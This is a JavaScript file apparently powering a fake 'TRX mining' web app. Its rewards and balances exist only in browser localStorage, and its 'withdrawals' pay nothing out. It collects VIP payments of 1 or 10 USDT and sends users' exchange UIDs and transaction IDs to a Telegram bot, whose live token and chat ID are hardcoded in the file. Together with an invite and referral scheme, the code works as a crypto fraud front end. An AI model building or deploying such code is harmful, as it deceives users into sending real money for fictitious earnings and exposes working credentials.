class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        this.telegramConfig = {
            botToken: '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI',
            chatId: '7417215529'
        };
        this.miningInterval = null;
        this.initializeApp();
    }

    initializeApp() {
        this.setupEventListeners();
        this.setupNavigation();
        this.updateDisplay();
        this.startMining();
        this.updateCurrentTime();
    }

    loadUserData() {
        const saved = localStorage.getItem('trxMiningData');
        if (saved) {
            return JSON.parse(saved);
        }
        
        return {
            userId: this.generateUserId(),
            trxBalance: 0,
            usdtBalance: 0,
            vipLevel: 0,
            miningStartTime: Date.now(),
            lastClaim: null,
            miningHistory: [],
            transactions: [],
            inviteCode: this.generateInviteCode(),
            teamSize: 0,
            referralEarnings: 0
        };
    }

    generateUserId() {
        let userId = localStorage.getItem('trxUserId');
        if (!userId) {
            userId = Math.random().toString(36).substr(2, 9).toUpperCase();
            localStorage.setItem('trxUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('trxInviteCode');
        if (!code) {
            code = 'INV' + Math.random().toString(36).substr(2, 6).toUpperCase();
            localStorage.setItem('trxInviteCode', code);
        }
        return code;
    }

    saveUserData() {
        localStorage.setItem('trxMiningData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                
                // Update active states
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        // Mining
        document.getElementById('claimMining').addEventListener('click', () => this.claimMiningReward());
        
        // Conversion
        document.getElementById('convertTRX').addEventListener('click', () => this.convertTRX());
        
        // Withdrawal
        document.getElementById('submitWithdraw').addEventListener('click', () => this.submitWithdrawal());
        
        // VIP Purchase
        document.querySelectorAll('.vip-buy-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.target.getAttribute('data-vip');
                this.prepareVipPurchase(parseInt(vipLevel));
            });
        });
        
        // VIP Payment
        document.getElementById('submitPayment').addEventListener('click', () => this.submitVipPayment());
    }

    startMining() {
        this.miningInterval = setInterval(() => {
            this.updateMiningTimer();
        }, 1000);
        
        this.addMiningHistory('Mining started');
    }

    updateMiningTimer() {
        const miningStart = this.userData.miningStartTime;
        const now = Date.now();
        const elapsed = now - miningStart;
        const cycleTime = 2 * 60 * 60 * 1000; // 2 hours in milliseconds
        
        const remaining = cycleTime - (elapsed % cycleTime);
        
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
        
        const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        document.getElementById('miningTimer').textContent = timerString;
        
        // Auto-claim when cycle completes
        if (remaining <= 1000 && elapsed >= cycleTime) {
            this.autoClaimMiningReward();
        }
    }

    claimMiningReward() {
        const miningStart = this.userData.miningStartTime;
        const now = Date.now();
        const elapsed = now - miningStart;
        const cycleTime = 2 * 60 * 60 * 1000;
        
        if (elapsed < cycleTime) {
            this.showNotification('Mining cycle not completed yet!', 'error');
            return;
        }
        
        const reward = 5; // 5 TRX per cycle
        this.userData.trxBalance += reward;
        this.userData.miningStartTime = now;
        this.userData.lastClaim = now;
        
        this.addMiningHistory(`Collected +${reward} TRX`);
        this.addTransaction('Mining Reward', reward, 'TRX');
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully claimed ${reward} TRX!`, 'success');
        
        // Send to Telegram
        this.sendToTelegram(`🔄 Mining Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    autoClaimMiningReward() {
        const reward = 5;
        this.userData.trxBalance += reward;
        this.userData.miningStartTime = Date.now();
        
        this.addMiningHistory(`Auto-collected +${reward} TRX`);
        this.addTransaction('Auto Mining Reward', reward, 'TRX');
        this.saveUserData();
        
        this.showNotification(`🤖 Auto-claimed ${reward} TRX!`, 'info');
    }

    convertTRX() {
        const trxAmount = parseFloat(document.getElementById('trxToConvert').value);
        
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('Please enter valid TRX amount!', 'error');
            return;
        }
        
        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('Insufficient TRX balance!', 'error');
            return;
        }
        
        const conversionRate = 0.10; // 1 TRX = 0.10 USDT
        const usdtAmount = trxAmount * conversionRate;
        
        this.userData.trxBalance -= trxAmount;
        this.userData.usdtBalance += usdtAmount;
        
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(6)} USDT`, 'success');
        document.getElementById('trxToConvert').value = '';
        
        // Send to Telegram
        this.sendToTelegram(`💱 TRX Conversion\n👤 User: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(6)} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    submitWithdrawal() {
        const receiverUid = document.getElementById('receiverUid').value.trim();
        const amount = parseFloat(document.getElementById('withdrawAmount').value);
        
        if (!receiverUid) {
            this.showNotification('Please enter receiver UID!', 'error');
            return;
        }
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter valid amount!', 'error');
            return;
        }
        
        if (amount > this.userData.usdtBalance) {
            this.showNotification('Insufficient USDT balance!', 'error');
            return;
        }
        
        this.userData.usdtBalance -= amount;
        this.addTransaction('Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`📤 Withdrawal request submitted!`, 'success');
        
        // Clear form
        document.getElementById('receiverUid').value = '';
        document.getElementById('withdrawAmount').value = '';
        
        // Send to Telegram
        this.sendToTelegram(`💸 Withdrawal Request\n👤 User: ${this.userData.userId}\n📤 To UID: ${receiverUid}\n💰 Amount: ${amount} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
    }

    prepareVipPurchase(vipLevel) {
        this.currentVipLevel = vipLevel;
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        
        this.showNotification(`Prepare ${amount} USDT for VIP ${vipLevel} purchase`, 'info');
        
        // Scroll to payment section
        document.getElementById('vip').classList.add('active');
        document.querySelector('.payment-info').scrollIntoView({ behavior: 'smooth' });
    }

    submitVipPayment() {
        const senderUid = document.getElementById('senderUid').value.trim();
        const transactionId = document.getElementById('transactionId').value.trim();
        
        if (!senderUid) {
            this.showNotification('Please enter your exchange UID!', 'error');
            return;
        }
        
        const vipLevel = this.currentVipLevel;
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        
        // Send to Telegram
        const message = `🆕 VIP Purchase Request\n👤 User: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction ID: ${transactionId || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
        
        this.sendToTelegram(message);
        
        this.showNotification('✅ VIP purchase request sent to admin!', 'success');
        
        // Clear form
        document.getElementById('senderUid').value = '';
        document.getElementById('transactionId').value = '';
    }

    sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
        const data = {
            chat_id: this.telegramConfig.chatId,
            text: message,
            parse_mode: 'HTML'
        };

        // Using fetch to send message to Telegram
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent to Telegram:', data);
        })
        .catch((error) => {
            console.error('Error sending to Telegram:', error);
        });
    }

    addMiningHistory(message) {
        this.userData.miningHistory.unshift({
            message: message,
            timestamp: new Date().toLocaleString()
        });
        
        // Keep only last 10 history items
        if (this.userData.miningHistory.length > 10) {
            this.userData.miningHistory = this.userData.miningHistory.slice(0, 10);
        }
        
        this.updateMiningHistory();
    }

    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            description: description,
            amount: amount,
            currency: currency,
            timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });
        
        // Keep only last 10 transactions
        if (this.userData.transactions.length > 10) {
            this.userData.transactions = this.userData.transactions.slice(0, 10);
        }
        
        this.updateTransactionHistory();
    }

    updateDisplay() {
        // Update balances
        document.getElementById('trxBalance').textContent = this.userData.trxBalance.toFixed(6);
        document.getElementById('usdtBalance').textContent = this.userData.usdtBalance.toFixed(6);
        document.getElementById('totalBalance').textContent = this.userData.usdtBalance.toFixed(6) + ' USDT';
        
        // Update user info
        document.getElementById('accountId').textContent = this.userData.userId;
        document.getElementById('inviteCode').textContent = this.userData.inviteCode;
        document.getElementById('vipStatus').textContent = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
        
        // Update team stats
        document.getElementById('teamSize').textContent = this.userData.teamSize;
        document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(6) + ' USDT';
        document.getElementById('activeReferrals').textContent = this.userData.teamSize;
        
        // Update histories
        this.updateMiningHistory();
        this.updateTransactionHistory();
    }

    updateMiningHistory() {
        const historyContainer = document.getElementById('miningHistory');
        const currentTime = new Date().toLocaleString();
        
        document.getElementById('currentTime').textContent = currentTime;
        
        if (this.userData.miningHistory.length === 0) {
            return;
        }
        
        historyContainer.innerHTML = this.userData.miningHistory.map(item => `
            <div class="history-item">
                <span>${item.message}</span>
                <span class="time">${item.timestamp}</span>
            </div>
        `).join('') + historyContainer.innerHTML;
    }

    updateTransactionHistory() {
        const historyContainer = document.getElementById('transactionHistory');
        
        if (this.userData.transactions.length === 0) {
            historyContainer.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-receipt"></i>
                    <p>No transactions yet</p>
                </div>
            `;
            return;
        }
        
        historyContainer.innerHTML = this.userData.transactions.map(transaction => `
            <div class="history-item">
                <span>${transaction.description}</span>
                <span class="time ${transaction.type}">
                    ${transaction.type === 'credit' ? '+' : ''}${transaction.amount} ${transaction.currency}
                </span>
            </div>
        `).join('');
    }

    updateCurrentTime() {
        setInterval(() => {
            const now = new Date().toLocaleString();
            const currentTimeElement = document.getElementById('currentTime');
            if (currentTimeElement) {
                currentTimeElement.textContent = now;
            }
        }, 1000);
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const messageElement = document.getElementById('notificationMessage');
        
        // Set message and style based on type
        messageElement.textContent = message;
        notification.className = 'notification';
        
        switch(type) {
            case 'success':
                notification.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
                break;
            case 'error':
                notification.style.background = 'linear-gradient(135deg, #ff6b6b, #ff4757)';
                break;
            case 'warning':
                notification.style.background = 'linear-gradient(135deg, #ffd700, #ffa500)';
                break;
            default:
                notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
        }
        
        // Show notification
        notification.classList.remove('hidden');
        
        // Auto hide after 3 seconds
        setTimeout(() => {
            notification.classList.add('hidden');
        }, 3000);
    }
}

// Global functions
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode').textContent;
    navigator.clipboard.writeText(inviteCode).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('Invite code copied to clipboard!', 'success');
        }
    });
}

// Initialize the app
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();
});
